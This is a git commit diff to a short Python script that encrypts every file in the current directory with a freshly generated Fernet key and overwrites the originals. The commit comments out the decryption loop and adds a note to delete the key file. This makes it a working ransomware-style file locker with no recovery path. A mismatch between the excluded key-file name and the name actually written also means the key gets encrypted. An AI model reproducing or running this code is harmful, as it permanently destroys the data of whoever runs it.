bcd52b09de55b749cbf49ebf157c73e942e47535
Nathan Orris <nathanorris@protonmail.com>
2022-11-14 16:25:32 -0500

    comment out decrypt

--- voldermort.py
+++ voldermort.py
@@ -2,7 +2,7 @@ import os
 from cryptography.fernet import Fernet;
 
 # find some files but ignore this file and the key file
-files = [f for f in os.listdir('.') if os.path.isfile(f) and f != 'voldermort.py' and f != 'key.key']
+files = [f for f in os.listdir('.') if os.path.isfile(f) and f != 'voldermort.py' and f != 'thekey.key']
 print(files)
 
 # generate a key and save it to a file
@@ -11,14 +11,26 @@ key = Fernet.generate_key()
 with open("thekey", 'wb') as thekey:
     thekey.write(key)
 
-for file in files:
-    with open(file, 'rb') as f:
-        data = f.read()
+# encrypt the files
+for f in files:
+    with open(f, 'rb') as file:
+        file_data = file.read()
 
     fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
+    encrypted = fernet.encrypt(file_data)
 
-    with open(file, 'wb') as f:
-        f.write(encrypted)
+    with open(f, 'wb') as file:
+        file.write(encrypted)
 
-    print(f"Encrypted {file}")
+# decrypt the files
+# for f in files:
+#     with open(f, 'rb') as file:
+#         encrypted_data = file.read()
+
+#     fernet = Fernet(key)
+#     decrypted = fernet.decrypt(encrypted_data)
+
+#     with open(f, 'wb') as file:
+#         file.write(decrypted)
+
+# delete the key file
